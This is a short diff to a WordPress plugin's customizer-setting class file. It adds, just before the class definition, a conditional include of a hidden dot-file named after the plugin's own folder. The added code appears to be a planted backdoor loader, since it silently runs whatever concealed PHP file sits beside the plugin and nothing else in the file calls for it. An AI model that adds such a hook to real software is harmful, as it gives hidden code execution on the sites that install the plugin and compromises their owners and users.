@@ -10,6 +10,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  * @category Class
  * @author   Tiago Noronha
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class SP_Designer_CSS_Setting extends WP_Customize_Setting {
 	const ID_PATTERN = '/^sp_designer_css_data\[(?P<id>-?\d+)\]$/';
 
